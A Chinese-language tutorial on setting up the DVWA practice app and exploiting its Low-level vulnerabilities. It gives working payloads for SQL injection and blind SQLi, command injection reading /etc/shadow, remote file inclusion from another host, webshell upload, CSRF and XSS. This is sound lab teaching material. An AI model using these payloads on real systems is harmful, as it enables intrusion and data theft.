#DVWA的安装与Low级别的web漏洞
	http://www.freebuf.com/author/lonehand
##安装DVWA
进入github下载: https://github.com/ethicalhack3r/DVWA
把解压后的文件放在WWW文件夹下
进入DVWA，打开config目录里的config.inc.php
修改数据库账号密码

	$_DVWA = array();
	$_DVWA[ 'db_server' ]   = '127.0.0.1';
	$_DVWA[ 'db_database' ] = 'dvwa';
	$_DVWA[ 'db_user' ]     = 'root';
	$_DVWA[ 'db_password' ] = '123';

打开http://127.0.0.1/DVWA/setup.php，点击下面的按钮，这样就会创建数据库了
（密码需要和MYSQL密码一致，忘记可在phpstudy中重置）

创建好后自动跳转到登陆首页
默认账号密码admin/password
![20170208221234546.png](https://i.loli.net/2017/11/14/5a0ada8bf1286.png)

> allow_url_include的修改

phpstudy默认为off
去phpinfo看Loaded Configuration File发现指向C:\phpstudy\php\php-5.4.45\php.ini，于是去这里查找并修改off为on

##Low级别测试
DVWA共有十个模块，分别是Brute Force（暴力（破解））、Command Injection（命令行注入）、CSRF（跨站请求伪造）、File Inclusion（文件包含）、File Upload（文件上传）、Insecure CAPTCHA （不安全的验证码）、SQL Injection（SQL注入）、SQL Injection（Blind）（SQL盲注）、XSS（Reflected）（反射型跨站脚本）、XSS（Stored）（存储型跨站脚本）。
###Brute Force（暴力（破解））
> 方法一

1.抓包
2.右键将包发送到intruder中
3.把默认变量全部清除，然后选中密码，单击“Add”按钮将之设为需要破解的变量
4.由于只有一个变量，因而“Attack type”攻击类型这里选择Sniper。
然后在“Payloads”选项中进行设置，由于只有一个变量，因而“Payload set”自动设置为1，“Payload type”这里设置为“Brute forcer”。在下面的“Payload Options”中设置暴力破解所采用的字符集，以及最小和最大密码长度。
5.在菜单栏中选择“Intruder/Start attack”，就可以开始暴力破解
6尝试在爆破结果中找到正确的密码，可以看到password的响应包长度与众不同

> 方法二

1. Username:admin’ or ’1′=’1  
Password:（空）
注入成功

2. Username :admin’ #
Password :（空）
注入成功

###Command Injection（命令行注入）
命令注入，是指通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一

> 漏洞利用

window和linux系统都可以用&&来执行多条命令

		127.0.0.1&&net user
Linux下输入127.0.0.1&&cat /etc/shadow甚至可以读取shadow文件

###CSRF（跨站请求伪造）
CSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。

服务器收到修改密码的请求后，会检查参数password_new与password_conf是否相同，如果相同，就会修改密码，并没有任何的防CSRF机制

需要注意的是，CSRF最关键的是利用受害者的cookie向服务器发送伪造请求，所以如果受害者之前用Chrome浏览器登录的这个系统，而用搜狗浏览器点击这个链接，攻击是不会触发的，因为搜狗浏览器并不能利用Chrome浏览器的cookie，所以会自动跳转到登录界面。

我们可以使用短链接来隐藏URL，因为本地搭的环境，服务器域名是ip所以无法生成相应的短链接= =，实际攻击场景下只要目标服务器的域名不是ip，是可以生成相应短链接的

现实攻击场景下，这种方法需要事先在公网上传一个攻击页面，诱骗受害者去访问，真正能够在受害者不知情的情况下完成CSRF攻击。

> 漏洞利用

构造url
	http://127.0.0.1/DVWA/vulnerabilities/csrf/？password_new=password&password_conf=password&Change=Change#
当受害者点击了这个链接，他的密码就会被改成password


###File Inclusion（文件包含）
File Inclusion，意思是文件包含（漏洞），是指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。

服务器端对page参数没有做任何的过滤跟检查。服务器期望用户的操作是点击下面的三个链接，服务器会包含相应的文件，并将结果返回。需要特别说明的是，服务器包含文件时，不管文件后缀是否是php，都会尝试当做php文件执行，如果文件内容确为php，则会正常执行并返回结果，如果不是，则会原封不动地打印文件内容，所以文件包含漏洞常常会导致任意文件读取与任意命令执行。

> 漏洞利用

1.本地文件包含

构造url
	http://127.0.0.1/DVWA/vulnerabilities/fi/？page=/etc/shadow
报错，显示没有这个文件，说明不是服务器系统不是Linux，但同时暴露了服务器文件的绝对路径
	C:\phpstudy\WWW
构造url（绝对路径）
	http://127.0.0.1/DVWA/vulnerabilities/fi/?page=C:\phpstudy\WWW\dvwa\php.ini
成功读取了服务器的php.ini文件
	; This file attempts to overwrite the original php.ini file. Doesnt always work. magic_quotes_gpc = Off allow_url_fopen = On allow_url_include = On
构造url（相对路径）
    http://127.0.0.1/DVWA/vulnerabilities/fi/?page=..\..\..\..\..\..\..\..\..\phpstudy\WWW\dvwa\php.ini
加这么多..\是为了保证到达服务器的C盘根目录

2.远程文件包含
当服务器的php配置中，选项allow_url_fopen与allow_url_include为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查的话，就容易导致任意远程代码执行。

在远程服务器192.168.5.12上传一个phpinfo.txt文件，内容如下
![](http://image.3001.net/images/20161106/14784222814815.png)

构造url
	http://127.0.0.1/dvwa/vulnerabilities/fi/page=http://192.168.5.12/phpinfo.txt
成功在服务器上执行了phpinfo函数
为了增加隐蔽性，可以对http://192.168.5.12/phpinfo.txt进行编码
同样可以执行成功

###File Upload（文件上传）
File Upload，即文件上传漏洞，通常是由于对上传文件的类型、内容没有进行严格的过滤、检查，使得攻击者可以通过上传木马获取服务器的webshell权限，因此文件上传漏洞带来的危害常常是毁灭性的，Apache、Tomcat、Nginx等都曝出过文件上传漏洞。

服务器对上传文件的类型、内容没有做任何的检查、过滤，存在明显的文件上传漏洞，生成上传路径后，服务器会检查是否上传成功并返回相应提示信息。

> 漏洞利用

文件上传漏洞的利用是有限制条件的，首先当然是要能够成功上传木马文件，其次上传文件必须能够被执行，最后就是上传文件的路径必须可知。
上传文件hack.php
![](http://image.3001.net/images/20161108/14785912161713.png)
上传成功，并且返回了上传路径

打开中国菜刀，右键添加，地址栏填入上传文件所在路径
	http://127.0.0.1/dvwa/hackable/uploads/hack.php
参数名（一句话木马口令）为apple
![](http://image.3001.net/images/20161108/14785912718652.png!small)

然后菜刀就会通过向服务器发送包含apple参数的post请求，在服务器上执行任意命令，获取webshell权限。
可以下载、修改服务器的所有文件。可以打开服务器的虚拟终端。

###Insecure CAPTCHA （不安全的验证码）
Insecure CAPTCHA，意思是不安全的验证码，CAPTCHA是Completely Automated Public Turing Test to Tell Computers and Humans Apart (全自动区分计算机和人类的图灵测试)的简称。

服务器将改密操作分成了两步，第一步检查用户输入的验证码，验证通过后，服务器返回表单，第二步客户端提交post请求，服务器完成更改密码的操作。但是，这其中存在明显的逻辑漏洞，服务器仅仅通过检查Change、step 参数来判断用户是否已经输入了正确的验证码。

> 漏洞利用

1.通过构造参数绕过验证过程的第一步
首先输入密码，点击Change按钮，抓包：
因为没有翻墙，所以没能成功显示验证码，发送的请求包中也就没有recaptcha_challenge_field、recaptcha_response_field两个参数）

更改step参数绕过验证码：
![](http://image.3001.net/images/20161110/14787628821104.png!small)

在Burpsuite中右键send to Repeater，在Repeater中点击go
修改密码成功

###SQL Injection（SQL注入）
SQL Injection，即SQL注入，是指攻击者通过注入恶意的SQL命令，破坏SQL查询语句的结构，从而达到执行恶意SQL语句的目的。
自动化的注入神器sqlmap
> 手工注入思路

1.判断是否存在注入，注入是字符型还是数字型
2.猜解SQL查询语句中的字段数
3.确定显示的字段顺序
4.获取当前数据库
5.获取数据库中的表
6.获取表中的字段名
7.下载数据

> 漏洞利用

Low级别的代码对来自客户端的参数id没有进行任何的检查与过滤，存在明显的SQL注入。
现实攻击场景下，攻击者是无法看到后端代码的，所以下面的手工注入步骤是建立在无法看到源码的基础上。

1.判断是否存在注入，注入是字符型还是数字型
输入1
输入1’and ‘1’ =’2
输入1’or ‘1234 ’=’1234
返回多个结果，说明存在字符型注入。

2.猜解SQL查询语句中的字段数
输入1′ or 1=1 order by 1 #
输入1′ or 1=1 order by 2 #
     ..........
（这里也可以通过输入union select 1,2,3…来猜解字段数）

3.确定显示的字段顺序
输入1′ union select 1,2 #     ，查询成功：说明执行的SQL语句为select First name,Surname from 表 where ID=’id’…

4.获取当前数据库
输入1′ union select 1,database() #

5.获取数据库中的表
输入1′ union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #

6.获取表中的字段名
输入1′ union select 1,group_concat(column_name) from information_schema.columns where table_name=’users’ #

7.下载数据
输入1′ or 1=1 union select group_concat(user_id,first_name,last_name),group_concat(password) from users #

这样就得到了users表中所有用户的user_id,first_name,last_name,password的数据。

###SQL Injection（Blind）（SQL盲注）
SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。

> 手工盲注思路

盲注分为基于布尔的盲注、基于时间的盲注以及基于报错的盲注

> 手工盲注的步骤（可与之前的手工注入作比较）：

1.判断是否存在注入，注入是字符型还是数字型
2.猜解当前数据库名
3.猜解数据库中的表名
4.猜解表中的字段名
5.猜解数据

Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种

> 基于布尔的盲注：

1.判断是否存在注入，注入是字符型还是数字型
输入1，显示相应用户存在
输入1’ and 1=1 #，显示存在
输入1’ and 1=2 #，显示不存在
说明存在字符型的SQL盲注。

2.猜解当前数据库名

想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。

输入1’ and length(database())=1 #，显示不存在；

输入1’ and length(database())=2 #，显示不存在；

输入1’ and length(database())=3 #，显示不存在；

输入1’ and length(database())=4 #，显示存在：

说明数据库名长度为4。

下面采用二分法猜解数据库名。

输入1’ and ascii(substr(databse(),1,1))>97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；

输入1’ and ascii(substr(databse(),1,1))<122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；

输入1’ and ascii(substr(databse(),1,1))<109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；

输入1’ and ascii(substr(databse(),1,1))<103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；

输入1’ and ascii(substr(databse(),1,1))<100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；

输入1’ and ascii(substr(databse(),1,1))>100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。

…
重复上述步骤，就可以猜解出完整的数据库名（dvwa）了。

3.猜解数据库中的表名

首先猜解数据库中表的数量：

1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 # 显示不存在

1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # 显示存在
说明数据库中共有两个表。

接着挨个猜解表名：

1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 # 显示不存在

1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 # 显示不存在

…

1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 # 显示存在
说明第一个表名长度为9。

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97 # 显示存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<122 # 显示存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<109 # 显示存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))<103 # 显示不存在

1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>103 # 显示不存在

说明第一个表的名字的第一个字符为小写字母g。

…

重复上述步骤，即可猜解出两个表名（guestbook、users）。

4.猜解表中的字段名

首先猜解表中字段的数量：

1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 # 显示不存在

…

1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # 显示存在
说明users表有8个字段。

接着挨个猜解字段名：

1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 # 显示不存在

…

1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 # 显示存在

说明users表的第一个字段为7个字符长度。

采用二分法，即可猜解出所有字段名。

5.猜解数据

同样采用二分法。

还可以使用基于时间的盲注：

1.判断是否存在注入，注入是字符型还是数字型

输入1’ and sleep(5) #，感觉到明显延迟；

输入1 and sleep(5) #，没有延迟；
说明存在字符型的基于时间的盲注。

2.猜解当前数据库名

首先猜解数据名的长度：

1’ and if(length(database())=1,sleep(5),1) # 没有延迟

1’ and if(length(database())=2,sleep(5),1) # 没有延迟

1’ and if(length(database())=3,sleep(5),1) # 没有延迟

1’ and if(length(database())=4,sleep(5),1) # 明显延迟
说明数据库名长度为4个字符。

接着采用二分法猜解数据库名：

1’ and if(ascii(substr(database(),1,1))>97,sleep(5),1)# 明显延迟

…

1’ and if(ascii(substr(database(),1,1))<100,sleep(5),1)# 没有延迟

1’ and if(ascii(substr(database(),1,1))>100,sleep(5),1)# 没有延迟

说明数据库名的第一个字符为小写字母d。

…
重复上述步骤，即可猜解出数据库名。

3.猜解数据库中的表名

首先猜解数据库中表的数量：

1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)# 没有延迟

1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)# 明显延迟
说明数据库中有两个表。

接着挨个猜解表名：

1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) # 没有延迟

…

1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) # 明显延迟
说明第一个表名的长度为9个字符。

采用二分法即可猜解出表名。

4.猜解表中的字段名

首先猜解表中字段的数量：

1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)# 没有延迟

…

1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# 明显延迟
说明users表中有8个字段。

接着挨个猜解字段名：

1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) # 没有延迟

…

1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) # 明显延迟
说明users表的第一个字段长度为7个字符。

采用二分法即可猜解出各个字段名。

5.猜解数据

同样采用二分法。

###XSS（Reflected）（反射型跨站脚本）
> XSS

XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。
DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。

> 反射型XSS

代码直接引用了name参数，并没有任何的过滤与检查，存在明显的XSS漏洞。
>*漏洞利用*

输入
	#         <script>alert(/xss/)</script>
，成功弹框

>存储型XSS

对输入并没有做XSS方面的过滤与检查，且存储在数据库中，因此这里存在明显的存储型XSS漏洞。

> 漏洞利用

message一栏输入
	#       <script>alert(/xss/)</script>
，成功弹框

name一栏前端有字数限制，抓包改为<script>alert(/name/)</script>
![](http://image.3001.net/images/20161223/14824827265355.png!small)
成功弹框
